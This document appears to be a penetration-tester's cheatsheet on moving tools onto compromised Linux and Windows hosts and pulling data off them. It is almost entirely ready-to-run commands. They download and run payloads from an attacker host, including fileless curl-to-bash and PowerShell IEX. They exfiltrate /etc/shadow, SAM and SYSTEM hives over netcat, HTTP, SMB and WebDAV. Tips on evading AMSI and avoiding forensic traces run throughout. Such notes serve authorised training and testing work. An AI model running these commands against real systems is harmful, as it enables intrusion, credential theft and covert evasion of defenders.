# File Transfer Methodology

> *Operational Workflow: Protocol Triage -> Windows Ingress/Egress Methods -> Linux Ingress/Egress Methods -> Kali Ingress Listeners -> Fileless In-Memory Execution -> Common Toolkit Locations -> Operational Checklist*
> *Essential Cheatsheets: [[🐧 linux-commands|Linux Commands]], [[🪟 windows-commands|Windows Commands]], [[🐢 reverse-shells|Reverse Shells]], [[🔀 ligolo-chisel|Ligolo & Chisel]], [[🔧 impacket|Impacket]]*

---

# Phase 0: File Transfer Concepts and Workflow

> *Moving binaries, scripts, and harvested credentials between Kali and target hosts is a fundamental requirement across every offensive engagement. Selecting the optimal transfer vector depends on target operating system, installed runtimes, egress filtering, and endpoint protection policies.*

### Operational Lifecycle: When Do You Transfer Files?

```text
1. INITIAL FOOTHOLD ESTABLISHED -> Upload automated enumeration scripts (linpeas.sh / winPEAS.exe).
2. PRIVILEGE ESCALATION IDENTIFIED -> Upload pre-compiled exploit binaries or source code.
3. CREDENTIALS HARVESTED -> Download SAM/SYSTEM hives, /etc/shadow, KeePass databases, or SSH keys.
4. EXAM FLAG DISCOVERY -> Capture proofs (proof.txt / local.txt) and verify screenshots with IP visible.
```

### Protocol Decision Matrix

```text
TARGET OS: LINUX
├── Has curl or wget?            -> HTTP Download (Fastest, standard choice)
├── Has Python / Perl / Ruby?    -> Built-in Language One-Liner
├── Has OpenSSH (scp / sftp)?    -> SCP Secure Copy (Most reliable when credentials exist)
├── Has Netcat / Busybox?        -> Netcat Socket Pipeline
├── Has Bash /dev/tcp?           -> Pure Bash TCP Socket (Zero-dependency fallback)
└── Completely restricted?       -> Base64 Copy-Paste Pipeline (Universal)

TARGET OS: WINDOWS
├── Has PowerShell?              -> Invoke-WebRequest (iwr) / WebClient / IEX Memory Stream
├── Has certutil?                -> Certutil URL Cache Download (Built-in legacy fallback)
├── Has SMB access allowed?      -> Impacket SMB Share (Execute directly from UNC path)
├── Has WinRM open?              -> Evil-WinRM Built-in upload / download commands
├── Has bitsadmin?               -> Background Intelligent Transfer Service (BITS)
├── Has WebDAV available?        -> WebDAV HTTP Mini-Redirector
└── Restricted Language / CMD?   -> Certutil Base64 Decode or VBScript Download One-Liner
```

---

# File Transfer Attack Vector Triage Matrix

> *Operational Triage: Select the appropriate transfer technique based on target capabilities, egress firewall restrictions, and security controls.*

| Operational Objective / Target Capability | Recommended Transfer Vector | Methodology Section |
| :--- | :--- | :--- |
| Linux target with standard web access | Wget or cURL HTTP Transfer | [[#1.1: Linux HTTP Ingress (Wget and cURL)]] |
| Linux target with no curl, wget, or nc | Bash /dev/tcp Pure Socket Transfer | [[#1.2: Linux Pure Bash TCP Socket Transfer (dev-tcp)]] |
| Linux target with scripting interpreters | Python, Perl, and PHP Ingress One-Liners | [[#1.3: Linux Scripting Interpreter One-Liners]] |
| Target with active SSH access | SCP and SFTP Encrypted Transfer | [[#1.4: Encrypted File Transfer via SCP and SFTP]] |
| Air-gapped or restricted shell (No network transfer) | Base64 Copy-Paste Pipeline | [[#Phase 3: Universal Base64 Transfer Pipeline]] |
| Windows target with PowerShell available | PowerShell IWR, WebClient, and BITS | [[#2.1: Windows PowerShell Ingress Vectors]] |
| Windows target with CMD only / Older Windows | Certutil URL Cache Download | [[#2.2: Windows Certutil URL Cache Download]] |
| Windows target / Avoid touching disk | Impacket SMB Direct Execution | [[#2.3: Windows SMB Share Transfer (Impacket smbserver)]] |
| Windows target in Restricted Language Mode | VBScript and JScript Ingress Scripts | [[#2.4: Windows VBScript and JScript Legacy Ingress]] |
| Windows target / Background stealth transfer | BITSAdmin and Start-BitsTransfer | [[#2.5: Windows BITS Background Transfers]] |
| Windows target with WinRM access | Evil-WinRM Native File Transfer | [[#2.6: Evil-WinRM Native File Transfer]] |
| Need to receive files on Kali from target (Exfiltration) | Kali Ingress Listeners (HTTP, Netcat, WebDAV) | [[#Phase 4: Exfiltration and Receiving Files on Kali]] |

---

# Phase 1: Linux File Transfer Vectors

## 1.1: Linux HTTP Ingress (Wget and cURL)

> *Standard HTTP downloads are the primary ingress method for Linux endpoints. Always stage files on Kali via port 80 or 443 to minimize perimeter firewall interference.*

### Staging on Kali Linux:
```bash
# Start temporary HTTP server hosting tools
cd /path/to/tools/
python3 -m http.server 80
```

### Downloading on Linux Target:
```bash
# Method A: Wget download to writable staging directory (/tmp or /dev/shm)
wget http://[KALI_IP]/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Method B: cURL download
curl -s http://[KALI_IP]/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Method C: Execute directly in memory via pipe (Fileless execution)
curl -s http://[KALI_IP]/linpeas.sh | bash
wget -qO- http://[KALI_IP]/linpeas.sh | bash
```

> 💡 **Operational Tip on Staging Paths:**
> Always write tools to `/dev/shm` (RAM disk) or `/tmp`. Writing to `/dev/shm` executes entirely in system RAM and leaves fewer physical disk artifacts.

---

## 1.2: Linux Pure Bash TCP Socket Transfer (dev-tcp)

> *Operational Context: High-security environments where `curl`, `wget`, `netcat`, and compilers have been uninstalled or restricted. Pure Bash includes built-in TCP socket redirection capabilities.*

```bash
# 1. On Kali: Serve the file via Netcat
nc -nlvp 80 < exploit.elf

# 2. On Target: Open raw TCP socket and redirect incoming stream to binary
bash -c 'cat < /dev/tcp/[KALI_IP]/80 > /tmp/exploit.elf'
chmod +x /tmp/exploit.elf
```

---

## 1.3: Linux Scripting Interpreter One-Liners

### Python 3 Ingress:
```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://[KALI_IP]/exploit.elf", "/tmp/exploit.elf")'
chmod +x /tmp/exploit.elf
```

### Python 2 Ingress:
```bash
python -c 'import urllib2; u = urllib2.urlopen("http://[KALI_IP]/exploit.elf"); f = open("/tmp/exploit.elf", "wb"); f.write(u.read()); f.close()'
chmod +x /tmp/exploit.elf
```

### PHP Ingress:
```bash
php -r 'file_put_contents("/tmp/exploit.elf", file_get_contents("http://[KALI_IP]/exploit.elf"));'
chmod +x /tmp/exploit.elf
```

### Perl Ingress:
```bash
perl -MLWP::Simple -e 'getstore("http://[KALI_IP]/exploit.elf", "/tmp/exploit.elf");'
chmod +x /tmp/exploit.elf
```

---

## 1.4: Encrypted File Transfer via SCP and SFTP

> *Use when valid SSH user credentials or private identity keys have been compromised.*

```bash
# Upload from Kali to Target:
scp -P 22 /opt/tools/linpeas.sh [USER]@[TARGET_IP]:/tmp/linpeas.sh
scp -i /path/to/id_rsa -P [PORT] /opt/tools/linpeas.sh [USER]@[TARGET_IP]:/tmp/linpeas.sh

# Download from Target to Kali (Exfiltration):
scp [USER]@[TARGET_IP]:/etc/shadow ./shadow_loot
scp -i /path/to/id_rsa [USER]@[TARGET_IP]:/root/proof.txt ./proof.txt
```

---

# Phase 2: Windows File Transfer Vectors

## 2.1: Windows PowerShell Ingress Vectors

> *PowerShell provides several robust APIs for staging files. Execution policy bypass (`-ep bypass`) should be appended when launching from standard CMD shells.*

### Method A: `Invoke-WebRequest` (iwr)
```powershell
# Standard PowerShell download
powershell -ep bypass -c "iwr -Uri http://[KALI_IP]/winPEAS.exe -OutFile C:\Windows\Temp\winPEAS.exe"

# Shortened PowerShell aliases
powershell -ep bypass -c "curl http://[KALI_IP]/winPEAS.exe -o C:\Windows\Temp\winPEAS.exe"
```

### Method B: `System.Net.WebClient` (Legacy Compatibility)
Compatible across older PowerShell versions (Windows 7 / Server 2008 R2) where `Invoke-WebRequest` fails:

```powershell
powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://[KALI_IP]/winPEAS.exe', 'C:\Windows\Temp\winPEAS.exe')"
```

### Method C: In-Memory Script Execution (`DownloadString` + `IEX`)
Executes `.ps1` payloads directly in RAM without writing to disk:

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/PowerView.ps1')"
```

> ⚠️ **AMSI Warning:**
> In-memory execution using `IEX` triggers Antimalware Scan Interface (AMSI) detection on modern Windows 10/11 and Server 2019/2022. If AMSI blocks execution, write the script to disk using Method A or apply an AMSI bypass prior to execution.

---

## 2.2: Windows Certutil URL Cache Download

> *`certutil.exe` is a built-in cryptographic utility available on all Windows versions. Its URL caching feature can download arbitrary files from HTTP/HTTPS servers.*

```cmd
:: Download file to disk using certutil
certutil -urlcache -f -split http://[KALI_IP]/winPEAS.exe C:\Windows\Temp\winPEAS.exe

:: Clean certutil URL cache post-download to minimize operational footprints
certutil -urlcache * delete
```

---

## 2.3: Windows SMB Share Transfer (Impacket smbserver)

> *Hosting an SMB share on Kali allows Windows targets to interact with tools using native SMB networking. Files can be copied or executed directly from UNC network paths without downloading.*

### Step 1: Start SMB Server on Kali Linux
```bash
# Option A: Anonymous SMB Server (SMB2 support enabled)
sudo impacket-smbserver share /opt/tools -smb2support

# Option B: Authenticated SMB Server (required by modern Windows 10/11 and Server 2019+)
sudo impacket-smbserver share /opt/tools -smb2support -user kali -password kali
```

### Step 2: Download or Execute from Target Host
```cmd
:: If using authenticated share, map network credentials first
net use \\[KALI_IP]\share /user:kali kali

:: Copy file to local disk
copy \\[KALI_IP]\share\winPEAS.exe C:\Windows\Temp\winPEAS.exe

:: Execute directly from UNC path (ZERO DISK WRITES!)
\\[KALI_IP]\share\winPEAS.exe
```

> 💡 **Operational Value of SMB Direct Execution:**
> Running binaries directly from an SMB share (`\\[KALI_IP]\share\binary.exe`) avoids creating physical disk artifacts on the target system, reducing forensic footprints and bypassing simple file-write detection rules.

---

## 2.4: Windows VBScript and JScript Legacy Ingress

> *When operating inside heavily restricted CMD shells lacking PowerShell, create a minimal VBScript file downloader on the fly:*

```cmd
echo strFileURL = "http://[KALI_IP]/nc.exe" > wget.vbs
echo strHDLocation = "C:\Windows\Temp\nc.exe" >> wget.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> wget.vbs
echo objXMLHTTP.send() >> wget.vbs
echo If objXMLHTTP.status = 200 Then >> wget.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> wget.vbs
echo objADOStream.open >> wget.vbs
echo objADOStream.type = 1 >> wget.vbs
echo objADOStream.write objXMLHTTP.responseBody >> wget.vbs
echo objADOStream.position = 0 >> wget.vbs
echo objADOStream.saveToFile strHDLocation, 2 >> wget.vbs
echo objADOStream.close >> wget.vbs
echo End if >> wget.vbs

:: Execute the script and clean up
cscript wget.vbs
del wget.vbs
```

---

## 2.5: Windows BITS Background Transfers

> *Background Intelligent Transfer Service (BITS) transfers files using idle network bandwidth. It is native to Windows, resilient to network disconnects, and operates cleanly via CMD or PowerShell.*

```cmd
:: CMD Syntax using bitsadmin
bitsadmin /transfer job_winpeas /download /priority high http://[KALI_IP]/winPEAS.exe C:\Windows\Temp\winPEAS.exe
```

```powershell
# PowerShell Syntax using BitsTransfer module
Start-BitsTransfer -Source http://[KALI_IP]/winPEAS.exe -Destination C:\Windows\Temp\winPEAS.exe -Priority High
```

---

## 2.6: Evil-WinRM Native File Transfer

> *If access is obtained via WinRM (Port 5985/5986), Evil-WinRM provides integrated upload and download commands that bypass network and protocol inspection.*

```text
# Inside active Evil-WinRM shell session:
*Evil-WinRM* PS C:\Temp> upload /opt/tools/winPEAS.exe C:\Temp\winPEAS.exe
*Evil-WinRM* PS C:\Temp> download C:\Users\Administrator\Desktop\proof.txt /home/kali/proof.txt
```

---

# Phase 3: Universal Base64 Transfer Pipeline

> *Operational Context: Complete network isolation, restricted shells, broken HTTP outbound connectivity, or strict application whitelisting. Copy-paste base64-encoded strings directly through your interactive terminal. Best suited for small binaries and scripts (< 100 KB).*

### Uploading to Linux Target via Base64:
```bash
# 1. On Kali: Encode file to single-line base64 string
base64 -w 0 /opt/tools/exploit.sh | xclip -selection clipboard
# (Or print and copy): base64 -w 0 /opt/tools/exploit.sh

# 2. On Target: Paste string and decode
echo "[PASTE_BASE64_STRING]" | base64 -d > /tmp/exploit.sh
chmod +x /tmp/exploit.sh
```

### Uploading to Windows Target via Base64:
```powershell
# 1. On Kali: Encode file to single-line base64 string
base64 -w 0 /opt/tools/nc.exe | xclip -selection clipboard

# 2. On Target (PowerShell): Decode string into binary file
powershell -ep bypass -c "[IO.File]::WriteAllBytes('C:\Windows\Temp\nc.exe', [Convert]::FromBase64String('[PASTE_BASE64_STRING]'))"
```

```cmd
:: Alternative Windows CMD: Using certutil -decode
:: 1. Echo encoded string to file
echo [PASTE_BASE64_STRING] > C:\Windows\Temp\encoded.txt
:: 2. Decode using certutil
certutil -decode C:\Windows\Temp\encoded.txt C:\Windows\Temp\nc.exe
del C:\Windows\Temp\encoded.txt
```

---

# Phase 4: Exfiltration and Receiving Files on Kali

> *Operational Objective: Download loot, password hashes, registry hives, and proof flags from the target back to Kali Linux.*

## 4.1: High-Performance Python Upload Server (HTTP POST)

```bash
# 1. On Kali: Install and start dedicated upload server
pip3 install uploadserver
python3 -m uploadserver 8080
```

```bash
# 2. From Linux Target: Send file via curl multipart form POST
curl -X POST http://[KALI_IP]:8080/upload -F "files=@/etc/shadow"
```

```powershell
# 3. From Windows Target: Send file via PowerShell multipart form POST
powershell -ep bypass -c "$FilePath = 'C:\Windows\Temp\sam.save'; $Uri = 'http://[KALI_IP]:8080/upload'; Add-Type -AssemblyName 'System.Net.Http'; $HttpClient = New-Object System.Net.Http.HttpClient; $Content = New-Object System.Net.Http.MultipartFormDataContent; $FileStream = [System.IO.File]::OpenRead($FilePath); $FileContent = New-Object System.Net.Http.StreamContent($FileStream); $Content.Add($FileContent, 'files', [System.IO.Path]::GetFileName($FilePath)); $Response = $HttpClient.PostAsync($Uri, $Content).Result; $FileStream.Close()"
```

---

## 4.2: Netcat Socket Exfiltration Pipeline

```bash
# 1. On Kali: Start listener redirecting incoming stream to loot file
nc -nlvp 4444 > exfiltrated_loot.tar.gz

# 2. From Linux Target: Push file directly to listener
nc -w 3 [KALI_IP] 4444 < /etc/shadow
# Or compress multiple files on the fly and stream across socket:
tar -czf - /var/log/ /etc/passwd | nc -w 3 [KALI_IP] 4444
```

---

## 4.3: Impacket SMB Server Exfiltration (Windows Target)

```bash
# 1. On Kali: Create writable staging directory and launch SMB share
mkdir /tmp/loot
sudo impacket-smbserver loot /tmp/loot -smb2support
```

```cmd
:: 2. On Windows Target: Copy secrets directly to Kali share
copy C:\Windows\Temp\sam.save \\[KALI_IP]\loot\sam.save
copy C:\Windows\Temp\system.save \\[KALI_IP]\loot\system.save
copy C:\Users\Administrator\Desktop\proof.txt \\[KALI_IP]\loot\proof.txt
```

---

## 4.4: WebDAV Exfiltration (When SMB Port 445 is Filtered)

> *Windows natively supports WebDAV file transfers via the WebClient service (HTTP Mini-Redirector). When firewalls block port 445, WebDAV operates transparently over standard HTTP port 80/85.*

```bash
# 1. On Kali: Start WebDAV server
pip3 install wsgidav cheroot
wsgidav --host=0.0.0.0 --port=85 --root=/tmp/loot --auth=anonymous
```

```cmd
:: 2. On Windows Target: Copy directly over WebDAV share
copy C:\Users\Administrator\Desktop\proof.txt \\KALI_IP@85\loot\proof.txt
```

---

# Phase 5: Common Operational Toolkits and Locations

### Standard Kali Toolkit Staging Paths

| Tool Name | Operational Purpose | Default Path on Kali Linux |
| :--- | :--- | :--- |
| **`linpeas.sh`** | Linux automated privilege escalation discovery | `/usr/share/peass/linpeas/linpeas.sh` |
| **`winPEAS.exe`** | Windows automated privilege escalation discovery | `/usr/share/peass/winpeas/winpeas64.exe` |
| **`pspy64`** | Linux process monitoring without root permissions | `/usr/share/pspy/pspy64` (or custom git clone) |
| **`chisel`** | Multiplexed port forwarding and SOCKS proxying | `/opt/tools/chisel` |
| **`agent` / `agent.exe`**| Ligolo-ng pivot agent for Linux and Windows | `/opt/tools/ligolo/` |
| **`nc.exe`** | Netcat Windows binary | `/usr/share/windows-resources/binaries/nc.exe` |
| **`mimikatz.exe`** | Windows memory credential extractor | `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe` |
| **`PowerView.ps1`** | Active Directory domain enumeration cmdlet suite | `/usr/share/windows-resources/powersploit/Recon/` |
| **`SharpHound.exe`** | BloodHound Active Directory data collector | `/usr/share/bloodhound/resources/SharpHound.exe` |
| **`whoah.exe` / Potatoes** | Token impersonation binaries (SigmaPotato, PrintSpoofer) | `/opt/tools/potatoes/` |

---

# Phase 6: Quick Reference File Transfer Checklist

```text
=== PHASE 1: TARGET CAPABILITY IDENTIFICATION ===
[ ] Check available tools on target (Linux)   -> which wget curl python python3 nc scp
[ ] Check available tools on target (Windows) -> where powershell certutil bitsadmin

=== PHASE 2: INGRESS EXECUTION (KALI -> TARGET) ===
[ ] Linux HTTP Ingress                        -> wget http://[KALI_IP]/tool -O /tmp/tool
[ ] Linux Fileless Execution                  -> curl -s http://[KALI_IP]/script.sh | bash
[ ] Linux Pure Bash Socket                    -> cat < /dev/tcp/[KALI_IP]/80 > /tmp/tool
[ ] Windows PowerShell IWR                    -> iwr http://[KALI_IP]/tool.exe -OutFile C:\Windows\Temp\tool.exe
[ ] Windows PowerShell WebClient              -> (New-Object Net.WebClient).DownloadFile(...)
[ ] Windows Certutil URL Cache                -> certutil -urlcache -f -split http://[KALI_IP]/tool.exe C:\Temp\tool.exe
[ ] Windows Impacket SMB Copy                 -> copy \\[KALI_IP]\share\tool.exe C:\Temp\tool.exe
[ ] Windows SMB Direct Execution              -> \\[KALI_IP]\share\tool.exe
[ ] Universal Base64 Pipeline                 -> base64 -w 0 file | xclip -> paste & decode

=== PHASE 3: EGRESS / EXFILTRATION (TARGET -> KALI) ===
[ ] Start Kali Ingress Listener               -> nc -nlvp 4444 > loot.txt  OR  python3 -m uploadserver 8080
[ ] Linux Netcat Exfiltration                 -> nc [KALI_IP] 4444 < /etc/shadow
[ ] Windows SMB Exfiltration                  -> copy C:\Windows\Temp\secrets.txt \\[KALI_IP]\share\secrets.txt
[ ] Windows PowerShell HTTP POST              -> Invoke-WebRequest -Uri http://[KALI_IP]:8080/upload -Method POST ...
[ ] Capture proof.txt Immediately             -> cat /root/proof.txt  OR  type C:\Users\Administrator\Desktop\proof.txt
```
